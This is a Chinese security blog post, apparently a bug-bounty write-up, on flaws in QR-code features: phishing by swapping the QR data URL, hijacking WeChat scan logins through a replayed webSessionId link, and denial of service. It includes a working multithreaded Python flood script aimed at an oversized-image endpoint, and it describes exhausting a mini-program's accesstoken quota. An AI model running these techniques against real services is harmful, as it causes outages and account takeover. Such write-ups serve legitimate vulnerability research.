#  二维码功能点SRC漏洞挖掘   
 GG安全   2025-04-25 08:04  
  
**免责声明**  
  
由于传播、利用本公众号红云谈安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号红云谈安全及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！本文为连载文章欢迎大家关注红云谈安全公众号！  
  
  
在漏洞挖掘过程中我们经常会遇到二维码，二维码出现的场景主要有支付状态下、扫描登录、扫码关注、扫码分享、扫码下载。针对生成二维码这个功能会产生什么样的漏洞呢？请让我一一给你讲解！  
## 二维码劫持（方式一）  
  
在我们进行支付时一般会出现一个二维码，还有进行扫码登录，微信分享篇文章时都会出现！很多生成这个二维码链接后面都会有一个URL地址，根据这个URL地址来生成二维码，你看下列案例。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRdDDVttyC8BoHzQrXI3cS5JiaFx2zm9KAu6e0BD4691QwIdicKqib0iaMog/640?wx_fmt=png "")  
  
生成一个二维码后，我们复制二维码地址，然后可以看到后面data值为一个URL地址，我们只需要将URL地址替换为钓鱼网站地址，对方扫码就能够跳转到钓鱼网站，这里添加为百度地址，用手机扫码后就会成功跳转到百度！这个一般是低危！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRKeRgvcBA85Z7dVSaicG44MPhVqMYcJmP6k5WNRc5SeX4iahLial4YJwIg/640?wx_fmt=png "")  
## 二维码劫持（方式二）  
  
不知道你会不发现就是非常多的登录框，都支持微信扫码登录，而在这个微信扫码登录的过程会出现什么样的安全问题呢？ 一般流程![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PR3XG52lFyToAMjYntG7v5YUViaCQOl3VzeoA0IUwtdY1iahbuT9cmiac0Q/640?wx_fmt=png "")  
  
  
首先出现一个微信扫码登录![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRHEP3HHJ1ZibHGB7EYfkZ9Jej5KHribicBUBXxZOF4fBibER3fjKRpMJGRA/640?wx_fmt=png "")  
使用微信扫完码后会跳转到一个微信公众号，点击关注公众号  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRr6jEiaBKrpIialxIg7T5lfroFtpjHEbdQJgicJoD2OBAJxxnQIvvaZo9Q/640?wx_fmt=png "")  
关注玩公众号后会出现，类似以下需要点击授权界面![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRnScoys2bC0rvRicUa2LX5hmic9CQf6IZVEOCGu5cBUn5Cvx7ic5KACicbQ/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRRxnibc8yfa8qEKsjAwbmedGJtWtpFzZt0mFDKN72qdpMLHa0ouW4cEw/640?wx_fmt=png "")  
  
当我们点击授权的时候，就会发现浏览器Web端页面跳转，登录成功！ 回到最初的微信扫码登录点，浏览器会一直发送请求数据包进入一种循环状态，判断是否扫描了二维码。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRWGWQAbIIvOHYwx6Z6vM68zHHCibN33QPbdGEUMcxYE7WqHF3fut5NhA/640?wx_fmt=png "")  
我们任意访问一个上面的请求包，你会发现post body的其中一个参数，“webSessionId”，记住这个值：819xxxxxxxxx![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRDVhyjOBjsvHSVtSHbALMVFk7ib3aMH2o8Yl0EpV0icCWEmiazOxSXFMCA/640?wx_fmt=png "")  
接下来我们去微信公众号中分析，先点击授权并抓包，你会发现有一个以下链接 https://xxx.aaa.com/api/login/auth?webSessionId=819xxxxxxxxx  
你可以惊奇的发现点击授权和我们浏览器中获取的值相同，这边有什么用呢？这是一个值得我们思考的问题，受害者扫码我们能否代替对方“点击授权”，我们有了webSessionId，可以自己构造点击授权的URL，然后使用自己的微信聊天框发送给自己的电脑，然后点击授权。 模拟攻击思路： 先发送一个链接给自己的电脑对话框好直接访问![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRaFLGgM7qhGA8uwtFBU5KmEia43M3AqEzicMmtFV9ToM2sIlqLnnZ5N8g/640?wx_fmt=png "")  
发送web端登录的二维码图片给受害者（这边有个限制就是必须在该二维码的有效时间扫描才有效）这要对方扫码后![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PROrwdsgvgGdfkCRA3zW89fVAXwMOv0NcN3fI4Qt7SiaWMDqIQhU1icY8g/640?wx_fmt=png "")  
只要一点击前往图中包含的公众号，不管他后面如果操作都不用去管，我们只要不断的去点击上方对话框的链接![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRKzb9ZUvrnCbrv1nLpTb0IDuicDFbWX5ROPXuP8FjpnuILK0ZzribxttA/640?wx_fmt=png "")  
看是否会到确认这一步即可，只要我们能够到这一步就能够获取到对方的账号权限。![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRrwoAwnRDYwkkpJMTcvLIKWmPRvCGlNtuLjt8JDh2ry1y8DPSOnvw2g/640?wx_fmt=png "")  
  
## 拒绝服务漏洞（高危）  
  
点击二维码登录并抓包  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRKwPCcUUXFJBwibqxUZZ5Vvqej4GVJZPiaR2kOicgyNhVzNKiaDLRtkJ7tw/640?wx_fmt=png "")  
接口如下: https://wwww.xxx.com/xxxx/xxxx/v1/xxxx?width=162&height=162 该请求上面width和height参数控制服务器返回图片的大小  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRiaDMgib0nes6t35qE9sB2FQM1KXgGWJM0ougvCwhAW7UBbFP8piaibFwvA/640?wx_fmt=png "")  
增大width和height值发现返回的数据也发生了变化、并且响应的时间也变长了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRWib3Vp4IAI9RibgbuB84Vwgf5AwmVLWILibEOfJWhD8Q92VA4QOW6ibH4Q/640?wx_fmt=png "")  
通过测试width和height最大为14000，要返回如此多的数据将是一个巨大的过程，直接使用Burp或者编写脚本进行批量请求就能够造成整个服务器拒绝服务，再其他产商也发现类似的漏洞，验证的时候可以这样排除干扰、使用2个网络：一个手机数据流量、一个是电脑所连接的WiFi、电脑进行ddos、手机使用数据流量、访问该链接，即可证明。将width和height值调到最大进行跑即可  
```
import requestsimport threadingimport time"""    @ 单线程为测试,可忽略    @ 使用时修改url即可    @ 可根据实际情况修改访问次数,默认为10000    @ 仅供学习参考,请勿实施攻击"""# 访问指定Urldef requser():    headers = {        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36'    }    # 将参数的设置为最大临界值的链接    url = "https://www.xxxx.com/xxxx?width=14000&height=14000"    # url = "https://www.baidu.com/"    req = requests.get(url=url, headers=headers)    print("resuest Success!")# 单线程访问def single_thread():    for i in range(50):        requser()        print(f"现在是第{i}次请求网页")# 多线程访问def multi_thread():    print("multi_thread begin")    threads = []    for i in range(10000):  # 10000为访问次数,可根据实际调整        threads.append(            threading.Thread(target=requser)        )    print(threads)    for thread in threads:        thread.start()    for thread in threads:        thread.join()    print("multi_thread end")if __name__ == '__main__':    # 单线程    # single_thread()    # 多线程    start = time.time()    multi_thread()    end = time.time()    t = end - start    print(f"multi thread cost:{t} s")
```  
  
为防止服务器瘫痪这边我只是跑了几秒钟做了一个简单的测试然后马上关闭了,使用手机进行访问，直接一直加载中，整个服务器瘫痪，用到该服务器下的所有接口将全部不能用，危害极大，这边因为只跑了几秒，所以服务器很快就恢复了，这边要跑的时候记得跟产商沟通别瞎跑，小心服务器真的给你跑蹦了！一般说明到上面不用跑也能说明危害了，产商需要进一步证明的话就直接跟产商沟通。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRppsBH6cOQLX1vZ0UMmv5SFfMQJIHxlDRfLl3z7g3aIkXBwG8s0TuOA/640?wx_fmt=png "")  
## 小程序扫码登录  
  
该功能点是通过微信小程序进行扫码登录，先点击个人登录抓个包试下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRcENpxSZnvouqLYgOdd997oBR7ZXN7dps3K24c1BcibNRaJVrQJUUqEw/640?wx_fmt=png "")  
  
在这里插入图片描述  
  
抓到这个接口数据包，返回一大串加密数据，该接口的字面意思就是获取微信的accesstoken![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRibiaJr8rglnXl0KVtnDFTE2LFjibGulmicEMWSSiaHslEtdyC1icoAibT1icOw/640?wx_fmt=png "")  
  
  
现在系统有太多这样使用微信小程序扫码登录的功能点了，所以我决定好好的去看看开发文档，以后说不一定能挖到非常多洞。 通过开发文档了解到accesstoken是微信小程序的调用命脉![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRhQic6O8XOyJ1lmIviamdD6OTebTIygl94WFT1dutWrLLwuajibGxRVTKQ/640?wx_fmt=png "")  
  
  
通过抓取的数据包知道上面的个人登录功能点是先获取accesstoken、再调用accesstoken来后去生成二维码。这里直接就获取微信小程序的accesstoken了、相当于无需知道appid和APPsecret就可以拿到accesstoken了，这里补充一下知识点。 根据小程序开发手册，如果你获取到appid和secret的话那么就可以直接获取到accesstoken  
```
https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid=APPID&secret=APPSECRET
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRiaanrrZYcmQBc3lmfx7CPbYsChA43ucFrQy5BltqiaSBXGOIJVohdLIg/640?wx_fmt=png "")  
  
在这里插入图片描述  
  
利用该accesstoken去在线开发者工具平台上传一张图片证明accesstoken是微信小程序的accesstoken 如下： 上传成功：![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRndiaSCb5EsYKo55vxXYsDKx2goQLVPR6Ul7heCGVBLgibcv9QML8ewHA/640?wx_fmt=png "")  
后续可以根据开发者文档调用很多微信小程序的接口、危害大。 还有微信开发者文档规定accesstoken一天只能获取两千次、可以通过该接口不断获取接口accesstoken、从而导致奔溃、后续只要有用到accesstoken的功能点和小程序都会无法使用![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRicAiaOyZcfMQc0Thtw6emWkXe3AkEaTMlyFeDcBVicSrDlibRWPm8QiblvQ/640?wx_fmt=png "")  
为了不影响业务在快凌晨12点的时候进行了测试复现![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRPRbRTicvUj4rlUmw3kmqvWqu5Ie6HdGIVm5dWbPkfN4y8lQYfDTUkGQ/640?wx_fmt=png "")  
Burp不断请求、一分钟不到就获取不到accesstoken![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PRiaCwzAicuiciccdgaYPJ6kolFwcU39TK9wJTX8tPGp6BuZWuh18eyFJ8jg/640?wx_fmt=png "")  
尝试进行登录，已经无法获取到二维码了、并且很多内容都是需要登录才可以进行查看的，危害非常大。![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsnvOqazeMH1ycPL4FB89xRC9zGJc0PR7nlovquvwKnKzY3p2BZyf9xwCnbencyic4uUEToTibDpYurG2KKJ3Y3A/640?wx_fmt=png "")  
  
  
  
**1**  
►  
  
**福利放送**  
  
    再次声明：本公众号及其发布的内容的使用者需自行承担由此产生的任何直接或间接的后果和损失，GG安全公众号和原文章作者不承担任何责任。  
  
****  
**edusrc邀请码 | 玄机邀请码**  
  
    免费不限量提供edusrc邀请码及  
玄机邀请码  
，可在的菜单栏  
资源获取-edusrc邀请码   
| 玄机邀请码  
中获取。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/ia30l0vOygMG0stgMGrb9qOt6icialDd5WP60Tuk8mdKsbAHGHRgZpIrV0yUN479hWrFTa8NoPEumPTP3h3bO4iaWQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
**2**  
►  
  
**往期精彩**  
  
[](https://mp.weixin.qq.com/s?__biz=MzIwMjE2NTM5Mg==&mid=2247485283&idx=1&sn=d26389e1d4ace54a43b2b2c893a474b6&scene=21#wechat_redirect)  
  
Edusrc高校证书测评  
  
  
[](https://mp.weixin.qq.com/s?__biz=MzIwMjE2NTM5Mg==&mid=2247485141&idx=1&sn=ffcd2813da3458253b630dfeb9fbe581&scene=21#wechat_redirect)  
  
绝版乌云重现：在VM中复活的安全宝藏  
  
  
[](https://mp.weixin.qq.com/s?__biz=MzIwMjE2NTM5Mg==&mid=2247484834&idx=1&sn=f5c5d3ca80704c6fcc466f7c24bd71d5&scene=21#wechat_redirect)  
  
钓鱼佬永不空军！社g之学姐送我“严重”漏洞  
  
  
